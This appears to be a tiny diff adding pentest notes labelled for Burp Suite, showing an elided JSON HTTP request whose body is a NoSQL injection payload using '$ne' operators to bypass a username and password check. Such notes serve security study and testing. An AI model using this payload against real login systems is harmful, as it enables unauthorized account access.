@@ -1,0 +1,15 @@
+
+ burpsuite:::
+		
+		.
+		.
+		.
+		.
+		Content-Type: application/json
+		.
+		.
+		.
+		.
+		.
+
+		{"username": {"$ne": "admin"}, "password": {"$ne": "admin"}}
